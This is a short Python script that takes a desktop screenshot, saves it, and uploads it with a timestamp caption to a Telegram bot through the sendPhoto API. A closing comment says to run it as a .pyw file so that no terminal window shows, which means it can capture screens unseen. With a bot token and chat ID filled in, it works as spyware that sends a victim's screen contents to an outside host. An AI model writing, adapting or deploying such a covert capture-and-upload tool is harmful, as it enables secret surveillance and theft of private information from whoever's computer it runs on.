import pyautogui
import requests
import datetime

base_url = "https://api.telegram.org/bot<YOUR BOT API TOKEN>/sendPhoto"

now = datetime.datetime.now()
Dateandtime = now.strftime("%y-%m-%d %H:%M:%S")

myScreenshot = pyautogui.screenshot()
myScreenshot.save(r'<PATH TO SAVE YOUR SCREENSHOTS>/screenshot.png')

my_file = open(r'<PATH TO SAVE YOUR SCREENSHOTS>/screenshot.png', "rb")

parameters = {
    "chat_id" : "CHAT ID",
    "caption" : Dateandtime
}


files = {
    "photo" : my_file
}

resp = requests.get(base_url, data = parameters, files=files)


# The file extensions is .pyw insted of .py becuase .py opens a terminal window while running which is visible in the Screenshot.
# .pyw does not opens a terminal window while running. so we get the full screenshot.
